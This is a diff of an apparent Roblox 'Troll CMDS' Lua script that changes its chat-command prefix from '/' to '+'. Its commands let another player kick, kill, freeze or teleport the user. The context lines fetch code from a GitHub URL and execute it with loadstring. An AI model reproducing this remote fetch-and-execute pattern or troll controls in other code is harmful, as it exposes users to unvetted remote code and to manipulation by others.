@@ -31,22 +31,22 @@ function xc_cmds(t, data_t)
   local hrp = plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
   local hmoid = plr and plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
   if hrp and hmoid and #data_t > 0 then
-    if isc(data_t, 1, "/br") then
+    if isc(data_t, 1, "+br") then
       hrp.CFrame = CFrame.new(t.Character:GetBoundingBox().Position)
       cstr("Dịch chuyển tức thời!")
-    elseif isc(data_t, 1, "/rs") then
+    elseif isc(data_t, 1, "+rs") then
       hmoid.Health = 0
       cstr("Reset nhân vật!")
-    elseif isc(data_t, 1, "/fz") then
+    elseif isc(data_t, 1, "+fz") then
       hrp.Anchored = not hrp.Anchored
       cstr(({["true"] = "Đông cứng ", ["false"] = "Rã đông "})[tostring(hrp.Anchored)] .. "nhân vật!")
-    elseif isc(data_t, 1, "/kc") then
+    elseif isc(data_t, 1, "+kc") then
       plr:Kick(gl_str(data_t))
-    elseif isc(data_t, 1, "/si") then
+    elseif isc(data_t, 1, "+si") then
       cstr(gl_str(data_t))
-    elseif isc(data_t, 1, "/test") then
+    elseif isc(data_t, 1, "+test") then
       print("TEST: " .. tostring(tick()) .. ".")
-    elseif isc(data_t, 1, "/ms") then
+    elseif isc(data_t, 1, "+ms") then
       local my_files = ws:FindFirstChild("HHxScripts")
       if my_files then
         for _, v in next, my_files:GetDescendants() do
@@ -79,7 +79,7 @@ plrs.PlayerAdded:Connect(function(t)
   end
 end)
 
-print("[Troll CMDS: Loaded]\n[/br, /rs, /fz, /kc, /ms]")
+print("[Troll CMDS: Loaded]\n[+br, +rs, +fz, +kc, +ms]")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ancient2k3/Status/refs/heads/main/Events/Notification.lua"))()
 local context = game:HttpGet("https://raw.githubusercontent.com/Ancient2k3/Tensura/refs/heads/slime/announcement")
 local fixed_content = ""
